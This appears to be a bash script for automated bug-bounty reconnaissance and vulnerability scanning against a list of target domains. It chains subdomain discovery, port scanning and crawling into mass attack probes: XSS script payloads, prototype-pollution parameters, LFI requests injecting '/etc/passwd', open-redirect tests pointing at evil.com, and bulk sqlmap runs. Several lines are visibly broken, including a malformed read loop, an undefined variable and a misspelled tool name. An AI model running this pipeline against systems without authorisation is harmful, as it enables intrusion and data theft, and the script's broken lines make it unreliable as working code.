#!/bin/bash

id="$1"
ppath="$(pwd)"

scope_path="$ppath/scope/$id"

timestamp="$(date +%s)"
scan_path="$ppath/scans/$id-$timestamp"

if [ ! -d "$scope_path" ]; then
    echo "Path doesn't exist!"
    exit 1
fi

mkdir -p "$scan_path"
cd "$scan_path"

allports="80,443,81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,8000,8001,8008,8014,8042,8060,8069,8080,8081,8083,8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9001,9043,9060,9080,9090,9091,9200,9443,9502,9800,9981,10000,10250,11371,12443,15672,16080,17778,18091,18092,20720,32000,55440,55672"

blacklist="md,jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico"
katanalist="js,jsp,json,php,aspx,asp"

###### Start the scan ######

### Set up
echo "Starting scan against roots"
cat "$scope_path/roots.txt"
cp -v "$scope_path/roots.txt" "$scan_path/roots.txt"

### Subdomain Discovery
echo "Subdomain Discovery" >> "$scan_path/tracking.txt" 
cat "$scan_path/roots.txt" | subfinder -all | anew "$scan_path/subfinder.txt"
findomain -f "$scan_path/roots.txt" -u "$scan_path/findomain.txt"
cat "$scan_path/roots.txt" | assetfinder --subs-only | anew "$scan_path/assetfinder.txt"
gospider -d 0 -S "$scan_path/roots.txt" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew "$scan_path/gospider.txt"
cat "$scan_path/subfinder.txt" "$scan_path/findomain.txt" "$scan_path/assetfinder.txt" "$scan_path/gospider.txt" | anew "$scan_path/subdomains.txt"
echo "Subdomain Discovery - Done" >> "$scan_path/tracking.txt"

### Traveling back in time
echo "Running wayback and gau" >> "$scan_path/tracking.txt"
cat "$scan_path/subdomains.txt" | waybackurls | anew "$scan_path/wayback.txt"
cat "$scan_path/subdomains.txt" | gau | anew "$scan_path/gau.txt"
cat "$scan_path/gau.txt" "$scan_path/wayback.txt" | anew "$scan_path/travel.txt" | httpx -silent | anew "$scan_path/200travelled.txt"
echo "Running wayback and gau - Done" >> "$scan_path/tracking.txt"

### Crawling
echo "Crawling with Naabu and Katana" >> "$scan_path/tracking.txt"
cat "$scan_path/subdomains.txt" | naabu -silent -ports $allports | anew "$scan_path/portscan.txt"
cat "$scan_path/portscan.txt" | httpx -silent | anew "$scan_path/200http.txt"
cat "$scan_path/200http.txt" | katana -d 10 -silent -o "katana.txt" -ef "$blacklist" -em "katanalist"
echo "Crawling with Naabu and Katana - Done" >> "$scan_path/tracking.txt"

### Validation
echo "Validating the Crawling Results" >> "$scan_path/tracking.txt"
cat "$scan_path/katana.txt" | unfurl domains | anew "$scan_path/unfurlDomains.txt"
cat "$scan_path/unfurlDomains.txt" "$scan_path/subdomains.txt" | anew "$scan_path/full.txt"
cat "$scan_path/full.txt" | httpx -silent | anew "$scan_path/full200.txt"
echo "Validating the Crawling Results - Done" >> "$scan_path/tracking.txt"

### Extracting juicy informations
echo "Collecting informations" >> "$scan_path/tracking.txt"
echo "Searching for juicy infos" >> "$scan_path/tracking.txt"
cat "$scan_path/full200.txt" "$scan_path/200travelled.txt" | anew "$scan_path/totaldomains.txt"
for domain in $(cat "$scan_path/totaldomains.txt"); do
    gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$domain?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | grep -wiE 'url' | awk '{print $2}' | sed 's/"//g' | sort -u | tee -a $scan_path/juicy_infos.txt
done

### Crawling JS
cat "$scan_path/full200.txt" | katana -d 10 -silent -em $katanalist -o "$scan_path/crawKatanaJS.txt"
echo "Crawling more JS" >> "$scan_path/tracking.txt"

### Searching 4Vulns
## XSS
mkdir -p "$scan_path/xss"
echo "Searching XSS" >> "$scan_path/tracking.txt"
cat "$scan_path/200travelled.txt" | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable" | tee -a "$scan_path/xss/waybackXSS.txt"; done
cat "$scan_path/full200.txt" | hakrawler -subs | grep "=" | qsregitplace '"' | airixss -payload "confirm(1)" | egrep -v 'Not'
gospider -S "$scan_path/200travelled.txt" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee "$scan_path/xss/gospiderXSS.txt"

cat "$scan_path/full200.txt" | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")" | anew "$scan_path/xss/getjsXSS.txt"
echo "Searching XSS - Done" >> "$scan_path/tracking.txt"

## Subdomain takeover
echo "Searching Subdomain Takeover" >> "$scan_path/tracking.txt"
subjack -w subdomains.txt -t 20 -o "$scan_path/takeover.txt" -ssl | notify -silent
echo "Searching Subdomain TakeOver - Done" >> "$scan_path/tracking.txt"

## Nuclei time
echo "Searching vulns with Nuclei" >> "$scan_path/tracking.txt"
cat "$scan_path/full200.txt" | nuclei -severity low,medium,high,critical -silent -o "$scan_path/nuclei.txt" -H "Kommandos" | notify -silent
echo "Searching vulns with Nuclei - Done" >> "$scan_path/tracking.txt"

## Prototype Pollution
echo "Searching for Prototype Pollution" >> "$scan_path/tracking.txt"
cat "$scan_path/full200.txt" | anew "$scan_path/prototypeTargets.txt" && sed 's/$/\/?__proto__[testparam]=exploit\//' "$scan_path/prototypeTargets.txt" | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" | anew "$scan_path/prototype.txt" | notify -silent
echo "Searching for Prototype Pollution - Done" >> "$scan_path/tracking.txt"

## Local File Inclusion
echo "Searching for LFI" >> "$scan_path/tracking.txt"
cat "$scan_path/full200.txt" | gau | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' | anew "$scan_path/LFI.txt" | notify -silent
echo "Searching for LFI - Done" >> "$scan_path/tracking.txt"

## Open Redirect
echo "Searching for Open Redirect" >> "$scan_path/tracking.txt"
cat "$scan_path/full200.txt" | gau | gf redirect | qsreplace | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"' | anew "$scan_path/openredirect.txt" | notify -silent
cat "$scan_path/200travelled.txt" | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I|grep "evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done​​
echo "Searching for Open Redirect - Done" >> "$scan_path/tracking.txt"

## SQLi Massive Files
echo "Searching for SQLi" >> "$scan_path/tracking.txt"
cat "$scan_path/full200.txt" | gf sqli >> "$scan_path/sqli.txt" | sqlmap -m sqli --batch --random-agent --level 1 | anew "$scan_path/sqli_results"
echo "Searching for SQLi - Done" >> "$scan_path/tracking.txt"

## Git Exposed
echo "Searching for Git Exposed" >> "$scan_path/tracking.txt"
cat "$scan_path/full200.txt" | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew git_result.txt
echo "Searching for Git Exposed - Done" >> "$scan_path/tracking.txt"


## Calculate the time diff
end_time=$(date +%s)
seconds=$(expr $end_time - $timestamp)
time=""

if [[ "$seconds" -gt 59 ]]
then
    minutes=$(expr $seconds / 60)
    time="$minutes minutes"
else
    time="$seconds seconds"
fi

statics="$scan_path/statics.txt"

## Statics
echo "## Subdomain discovery" >> $statics
echo "\n# Subfinder" >> $statics
cat "$scan_path/subfinder.txt" | wc -l | tee -a $statics
echo "\n # Findomain" >> $statics
cat "$scan_path/findomain.txt" | wc -l | tee -a $statics
echo "\n # Assetfinder" >> $statics
cat "$scan_path/assetfinder.txt" | wc -l | tee -a $statics
echo "\n ## Total" >> $statics
cat "$scan_path/subdomains.txt" | wc -l | tee -a $statics


### Cleaning up
# Recon Files
mkdir -p "$scan_path/files"
mv "$scan_path/findomain.txt" $recon_files
mv "$scan_path/subfinder.txt" $recon_files
mv "$scan_path/assetfinder.txt" $recon_files
mv "$scan_path/prototypeTargets.txt" "$scan_path/files/"
mv "$scan_path/sqli.txt" "$scan_path/files/"

echo "Scan $id took $time"
echo "Statics saved on $statics"